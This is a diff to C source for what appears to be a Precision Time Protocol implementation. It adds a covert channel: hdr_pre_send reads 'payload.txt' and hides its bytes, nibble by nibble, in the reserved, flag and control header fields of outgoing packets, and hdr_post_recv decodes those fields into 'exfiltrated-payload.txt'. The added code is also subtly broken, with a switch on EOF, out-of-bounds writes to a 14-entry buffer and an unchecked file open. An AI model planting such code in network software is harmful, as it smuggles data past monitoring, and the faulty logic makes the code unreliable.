@@ -33,6 +33,7 @@
 int assume_two_step = 0;
 unsigned int message_counter = 0;
 unsigned int payload_counter = 0;
+size_t pos = 0;
 
 /*
  * Head room fits a VLAN Ethernet header, and 'msg' is 64 bit aligned.
@@ -714,154 +715,156 @@ static int hdr_post_recv(struct ptp_header *m)
 {
 
 	// convert byte order
-	if ((m->ver & VERSION_MASK) != VERSION)
-		return -EPROTO;
-	m->messageLength = ntohs(m->messageLength);  // converts UInteger16 messageLength from network byte order to host CPU byte order
-	m->correction = net2host64(m->correction);  // converts Integer64 correction from network byte order to host CPU byte order
-	m->sourcePortIdentity.portNumber = ntohs(m->sourcePortIdentity.portNumber);  // converts UInteger16 sourcePortIdentity.portNumber from network byte order to host CPU byte order
-	m->sequenceId = ntohs(m->sequenceId);  // converts UInteger16 sequenceId from network byte order to host CPU byte order
+		if ((m->ver & VERSION_MASK) != VERSION)
+			return -EPROTO;
+		m->messageLength = ntohs(m->messageLength);  // converts UInteger16 messageLength from network byte order to host CPU byte order
+		m->correction = net2host64(m->correction);  // converts Integer64 correction from network byte order to host CPU byte order
+		m->sourcePortIdentity.portNumber = ntohs(m->sourcePortIdentity.portNumber);  // converts UInteger16 sourcePortIdentity.portNumber from network byte order to host CPU byte order
+		m->sequenceId = ntohs(m->sequenceId);  // converts UInteger16 sequenceId from network byte order to host CPU byte order
 	
 	// print header fields to terminal
-	// print_headers_to_terminal(m, "POST-RECEIVE");
+		// print_headers_to_terminal(m, "POST-RECEIVE");
 
 	// print header fields to file
-	// print_headers_to_file(m, "post-receive.txt");
+		// print_headers_to_file(m, "post-receive.txt");
+	
+	// print payload to file
+		FILE *exfp;
+		exfp = fopen("exfiltrated-payload.txt", "a");
+		fprintf(exfp, "%c", (m->ver & 0xf0) | (m->reserved1 >> 4));
+		fprintf(exfp, "%c", ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4));
+		fprintf(exfp, "%c", (m->reserved2 >> 24) & 0xff);
+		fprintf(exfp, "%c", (m->reserved2 >> 16) & 0xff);
+		fprintf(exfp, "%c", (m->reserved2 >> 8) & 0xff);
+		fprintf(exfp, "%c", (m->reserved2) & 0xff);
+		fprintf(exfp, "%c", (m->control) & 0xff);
+		fclose(exfp);
 
 	// return
-	return 0;
+		return 0;
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////// hdr_pre_send
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////// uses ptp_header
 static int hdr_pre_send(struct ptp_header *m)
 {
-	// DEBUG
-	// fprintf(stderr, "[DEBUG]\tmsg.c\thdr_pre_send\n");
+	// initialization
+		unsigned int *payload;
+		char *filename = "payload.txt";
+		char ch;
+		int i, j;
+
+	// open file
+		FILE *fp = fopen(filename, "r");
+	
+	// error check
+		if(fp == NULL) {
+			printf("Error: could not open file %s", filename);
+		}
+
+	// allocate payload
+		payload = (unsigned int *)malloc(14*4);
+
+	// returned to saved position
+		fseek(fp, pos, SEEK_SET);
+		// printf("%ld\n", pos);
+
+	// get next values
+		for(i = (2*pos); i<((2*pos)+14); i++) {
+			ch = fgetc(fp);
+			switch(EOF) {
+				case '4':
+					// printf("\t%#x ", ch);
+					payload[i] = (unsigned int)((ch >> 4) & 0xf);
+					// printf("(%d-%d)\t%#x ", i, (i+1), payload[i]);
+					i++;
+					payload[i] = (unsigned int)(ch & 0x0f);
+					// printf("%#x\n", payload[i]);
+					i++;
+					for(j=i; j<((2*pos)+14); j++) {
+						payload[j] = (unsigned int)(0x0);
+						// printf("\t%#x\n", payload[j]);
+						j++;
+						payload[i] = (unsigned int)(0x0);
+						// printf("\t%#x\n", payload[j]);
+					}
+					break;
+				default:
+					// printf("\t%c ", ch);
+					payload[i] = (unsigned int)(ch >> 4);
+					// printf("(%d-%d)\t%#x ", i, (i+1), payload[i]);
+					i++;
+					payload[i] = (unsigned int)(ch & 0x0f);
+					// printf("%#x\n", payload[i]);
+					break;
+			}
+			if(ch == EOF) {
+				fseek(fp, 0, SEEK_SET);
+				break;
+			}
+		}
 
 	// modify header values
-	// // reserved (nibble)
-	// 	m->ver = m->ver | 0xf0;
-	// // reserved1 (byte)
-	// 	m->reserved1 = 0xff;
-	// // flagField[0] (byte)
-	// 	m->flagField[0] = m->flagField[0] | 0xf8;
-	// // flagField[1] (byte)
-	// 	m->flagField[1] = m->flagField[1] | 0x80;
-	// // reserved2 (dword)
-	// 	m->reserved2 = 0xffffffff;
-	// // control (byte)
-	// 	m->control = 0xff;
+		// reserved (nibble)
+			m->ver = m->ver | (payload[(2*pos)]<<4);
+			// printf("\n%lu\t%#x\n", (2*pos), (m->ver >> 4));
+		// reserved1 (byte)
+			m->reserved1 = (payload[(2*pos)+1]<<4) | payload[(2*pos)+2];
+			// printf("%lu-%lu\t%#x\n", ((2*pos)+1), ((2*pos)+2), (m->reserved1));
+		// flagField[0] (byte)
+			m->flagField[0] = m->flagField[0] | (payload[(2*pos)+3]<<4);
+			// printf("%lu\t%#x\n", ((2*pos)+3), (m->flagField[0] >> 4));
+		// reserved2 (dword)
+			m->reserved2 = (payload[(2*pos)+4] << 28) | 
+							(payload[(2*pos)+5] << 24) |
+							(payload[(2*pos)+6] << 20) |
+							(payload[(2*pos)+7] << 16) |
+							(payload[(2*pos)+8] << 12) |
+							(payload[(2*pos)+9] << 8) |
+							(payload[(2*pos)+10] << 4) |
+							payload[(2*pos)+11];
+			// printf("%lu-%lu\t%#x\n", ((2*pos)+4), ((2*pos)+11), (m->reserved2));
+		// control (byte)
+			m->control = (payload[((2*pos)+12)] << 4) | payload[((2*pos)+13)];
+			// printf("%lu-%lu\t%#x\n", ((2*pos)+12), ((2*pos)+13), (m->control));
 
+	// save position in file
+		// printf("%ld\n", ftell(fp));
+		pos = ftell(fp);
+		// printf("%ld\n", pos);
+
+	// close file
+		fclose(fp);
 
 	// print header fields to terminal
-	// print_headers_to_terminal(m, "PRE-SEND");
+		// print_headers_to_terminal(m, "PRE-SEND");
 
 	// print header fields to file
-	print_headers_to_file(m, "pre-send.txt");
+		print_headers_to_file(m, "pre-send.txt");
+
+	// print payload to file
+		FILE *exfp;
+		exfp = fopen("exfiltrated-payload.txt", "a");
+		fprintf(exfp, "%c", (m->ver & 0xf0) | (m->reserved1 >> 4));
+		fprintf(exfp, "%c", ((m->reserved1 & 0x0f) << 4) | (m->flagField[0] >> 4));
+		fprintf(exfp, "%c", (m->reserved2 >> 24) & 0xff);
+		fprintf(exfp, "%c", (m->reserved2 >> 16) & 0xff);
+		fprintf(exfp, "%c", (m->reserved2 >> 8) & 0xff);
+		fprintf(exfp, "%c", (m->reserved2) & 0xff);
+		fprintf(exfp, "%c", (m->control) & 0xff);
+		fclose(exfp);
 
 	// convert byte order
 	m->messageLength = htons(m->messageLength);  // converts UInteger16 messageLength from host CPU byte order to network byte order
 	m->correction = host2net64(m->correction);  // converts Integer64 correction from host CPU byte order to big endian byte order
 	m->sourcePortIdentity.portNumber = htons(m->sourcePortIdentity.portNumber);  // converts UInteger16 sourcePortIdentity.portNumber from host CPU byte order to network byte order
-	m->sequenceId = htons(m->sequenceId);  // converts UInteger16 sequenceId from from host CPU byte order to network byte order
-	
-	// log message
-	// log_message(m);
-
-	// parse payload
-		// unsigned int *payload = parse_payload();
-	
-	// encode payload
-	// STOPPED HERE
-	// NOT WORKING!!
-		// // reserved (nibble)
-		// 	m->ver = m->ver | (payload[payload_counter] << 4);
-		// 	printf("%a\n", m->ver);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// // reserved1 (byte)
-		// 	m->reserved1 = (payload[payload_counter] << 4);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved1 = m->reserved1 | payload[payload_counter];
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	printf("%a\n", m->reserved1);
-		// // flagField[0] (byte)
-		// 	m->flagField[0] = m->flagField[0] | (payload[payload_counter] << 4);
-		// 	printf("%a\n", m->flagField);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// // reserved2 (dword)
-		// 	m->reserved2 = (payload[payload_counter] << 28);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | (payload[payload_counter] << 24);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | (payload[payload_counter] << 20);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | (payload[payload_counter] << 16);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | (payload[payload_counter] << 12);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | (payload[payload_counter] << 8);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | (payload[payload_counter] << 4);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->reserved2 = m->reserved2 | payload[payload_counter];
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	printf("%a\n", m->reserved2);
-		// // control (byte)
-		// 	m->control = 0xff;
-		// 	m->control = (payload[payload_counter] << 4);
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	m->control = m->control | payload[payload_counter];
-		// 	payload_counter++;
-		// 	if(payload[payload_counter]==NULL){
-		// 		payload_counter = 0;
-		// 	}
-		// 	printf("%a\n", m->control);
-	
+	m->sequenceId = htons(m->sequenceId);  // converts UInteger16 sequenceId from from host CPU byte order to network byte order	
 
 	// free payload
-	// free(payload);
+		free(payload);
 
 	// return
-	return 0;
+		return 0;
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////// msg_suffix
